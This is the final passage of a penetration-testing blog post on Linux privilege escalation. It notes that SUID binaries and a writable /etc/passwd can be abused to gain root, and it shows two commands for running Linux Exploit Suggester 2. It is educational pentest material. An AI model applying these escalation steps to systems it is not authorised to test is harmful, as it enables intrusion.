<p class="ai-optimize-143"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MQpAbCXeuLw/YENTVDKih1I/AAAAAAAAufs/Ts7Uw83-Z0Yl0EbB7qcj-9qdtDhijDpNwCLcBGAsYHQ/s16000/23.png"/></span></p>
<p class="ai-optimize-144"><span style="color: #000000;">The SUID files such as nano, cp, find, etc., can elevate privilege. We can also see that someone can write to the /etc/passwd file, which can create a high privilege user and then use it to log in to the target machine.</span></p>
<p class="ai-optimize-145"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RBZhaO4dEt0/YENTZt-jVRI/AAAAAAAAufw/YgI3vSxy5ZceU5j-i4S2PeRSlR4JmbHuwCLcBGAsYHQ/s16000/24.png"/></span></p>
<h3 class="ai-optimize-146"><span style="color: #800000;">Linux Exploit Suggester 2</span></h3>
<p class="ai-optimize-147"><span style="color: #000000;">We discussed the Linux Exploit Suggester. However, now take a look at the Next-generation Linux Exploit Suggester 2. It is heavily based on the first version. There have been some niche changes that include more exploits, and it has an option to download the detected exploit code directly from Exploit DB. It also offers more accurate wildcard matching and expands the scope of searchable exploits. Last but not least, it supports Colored Output.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">chmod 777 linux-exploit-suggester-2.pl
./linux-exploit-suggester-2.pl -k 3</pre>
<p class="ai-optimize-148"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-D8uHKYWPAGQ/YENTeGXXlGI/AAAAAAAAuf0/hUMM0wAu4vM-xDdzXm9hnVGx5ah8xZlmgCLcBGAsYHQ/s16000/25.png"/></span></p>
<h3 class="ai-optimize-149"><span style="color: #800000;">Conclusion</span></h3>
<p class="ai-optimize-150"><span style="color: #000000;">The point that we are trying to convey through this article is that there are multiple scripts and executables and batch files to consider while doing Post Exploitation on Linux-Based devices. We wanted this article to serve as your go-to guide whenever you are trying to elevate privilege on a Linux machine irrespective of the way you got your initial foothold.</span></p>
<p class="ai-optimize-6"><span style="color: #000000;">To Learn more about Privilege Escalation. Follow this <a href="https://www.hackingarticles.in/category/privilege-escalation/"><span style="color: #0000ff;">Link</span>.</a></span></p>
<p class="ai-optimize-151"><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
